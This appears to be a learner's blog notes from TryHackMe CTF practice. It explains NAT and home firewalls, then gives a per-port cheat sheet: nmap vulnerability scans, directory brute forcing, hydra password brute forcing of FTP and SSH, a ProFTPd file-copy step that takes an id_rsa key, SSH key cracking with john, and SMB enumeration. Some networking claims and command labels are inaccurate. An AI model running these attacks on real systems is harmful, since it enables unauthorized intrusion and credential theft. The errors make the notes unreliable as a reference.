I've been going through the learning paths on TryHackMe.com. This is what I have learned from this experience. The majority of CTFs are based on web servers. 
This makes sense because web servers are accessible from an internet connection, this makes them more vulnerable to attacks. For example, it is much easier to
identify security vulnerabilities a local store because it allows public access, unlike a house, which is private and normally locked from public access. Since a web 
server has to be accessed publicly on the web, it leaves itself vulnerable to attacks 24/7. 

In order for perform NMAP scans, you have to be on the same network as the target machine (most like a web server). When you are connected to the internet, you are 
connected to the worlds largest public network. It might seem obvious but when you are able to a ping of www.google.com, this means that you are on the same network 
that the web server at Google or at least the web servers that hosts Google web page.

It's important to understand the difference between private networks and public networks, in order to understand the attack surface. What is vulnerable to attacks? 
When you purchase home internet, you are given both a public IP and a range of private IP addresses. What happens when you access a website, the router converts your 
private IP address to a public IP address, in order to communicate with a web server. This is called NAT (network address translation). 

The home internet router is also a firewall, meant to prevent requests that were not send by someone inside the network. It allows traffic to enter back into your
private network only because it was first requested by a device on the private network. This is why clicking on unknown websites or email links are so dangerous, the
request comes from a device on your private network, allowing that traffic back into your private network.

Back to NMAP scans, the majority of CTFs are going to start with an NMAP scan. This allows you to see the attack surface of a system with open ports, services, and 
service versions. In order to interact with other devices, ports are opened to run services as either the client or server. 
 
NMAP - scans for open ports and services (more complex NMAP scans find more vulnerabilities but take longer to scan)
 
#quick nmap 
cmd: nmap -Pn -T5 [IP] 
 
#basic nmap 
cmd: nmap -v -sC -sV [IP] 
 
#through nmap 
cmd: nmap -A -T4 -p- [IP]  
 
#nmap vulnerability 
cmd: nmap -sV -vv - - script vuln [IP] 
 
#more common for Windows 
cmd: nmap -sV -vv --script vuln [IP]  
 
#more specific after finding open ports 
cmd: nmap -T4 -A -sC -sV --script=vuln -p22,80,3306 10.10.156.87  
 
#scanning for script FTP 
cmd: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP 
 
#SMB vuln 
cmd: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $I
 
Since most CTFs are web servers, once you have the IP address, try putting the IP address in the web browser. Also try starting a gobuster scan (gobuster scans 
attempt to find subpages, these subpages can sometimes cause vulnerabilities):

PORT 80 - HTTP

#Check web source code

#Run gobuster scan to find hidden web directories
cmd: gobuster dir -u http://[IP] -w [wordlist path] -x php,sh,txt,cgi,html,js,css,py -t 200 --no-error | tee gobuster.txt

Common Directories
robots.txt
uploads
admin
administrator
config

#dirsearch: gobuster alternate - scans hidden web directories
cmd: dirsearch -u $IP -e php,html,txt,aspx,css -w /opt/dir -t 50 -r

#Vuln scan with Nikto
cmd: nikto -h “http://[IP]”

#Get Source Code in terminal
curl - pulls page source
 
PORT 21: FTP

#log into ftp 
cmd: ftp $IP 

#if you find username, try brute forcing password 
cmd: hydra for ftp: hydra -l [user] -P /opt/rockyou.txt ftp://[IP] 

#get file from ftp 
cmd: get file.txt 

#add file to ftp 
cmd: put file.txt 

#Mounting an FTP share, exploiting ProFTPd 
cmd: nc $IP 21 
cmd: SITE CPFR /path/to/fiile 
cmd: SITE CPTO /var/tmp/id_rsa 
cmd: mount $IP:/var /path/on/attackersPC 

PORT 22: SSH

#log into ssh 
cmd: ssh [user]@[IP] 

#with id_rsa file  
cmd: ssh -i id_rsa [username]@[IP] 

#if you find username, try brute forcing it 
cmd: hydra -t 4 -l username -P /opt/rockyou.txt ssh://$IP 

#ssh into another PC using another subnet 
cmd: netstat -ano 
cmd: ssh -L port:$IP:port user@$IP2 

#try to find hidden password in id_rsa file:  
cmd: python ssh2john.py id_rsa > id_rsa.hash 
cmd: john id_rsa.hash -wordlist=/opt/rockyou.txt 

PORT 139 or 445: SMB

#NMAP scan to see SMB vuln 
cmd: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP 
*Kenobi had SMB vuln that allowed mounting of readable shares  

#Listing SMB folders: 
cmd: smbclient -L $IP 

#viewing SMB shares 
cmd: smbclient //$IP/share 

#Recursive SMB folders:  
cmd: smbget -R smb://<ip>/anonymous 

#Discover shared SMB folders and username: expose usernames 
cmd: enum4linux -a [IP] 

#MetaSploit option for finding SMB version 
cmd: msfconsole -q 
cmd: use scanner/smb/smb_version 

#For anonymous SMB login 
cmd: smbclient ‘//[IP]/[USERNAME]’ 

#For local SMB user  
cmd: smbclient -U [username] ‘//[IP]/[username] or smbclient //[IP]/[share] -U [user] -p [port]

#For domain SMB user 
cmd: smbclient -U [domain]\[username] ‘//[IP]/[username] 

To be continued...
